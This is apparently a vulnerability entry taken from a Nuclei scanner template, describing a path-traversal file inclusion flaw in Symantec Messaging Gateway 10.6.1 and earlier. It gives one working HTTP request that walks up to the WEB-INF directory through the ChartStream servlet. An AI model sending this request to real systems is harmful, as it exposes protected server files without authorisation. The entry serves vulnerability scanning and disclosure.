# Vulnerability: Symantec Messaging Gateway <=10.6.1 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`symantec-messaging-gateway.yaml`)

## Description
Symantec Messaging Gateway 10.6.1 and prior are vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/
```

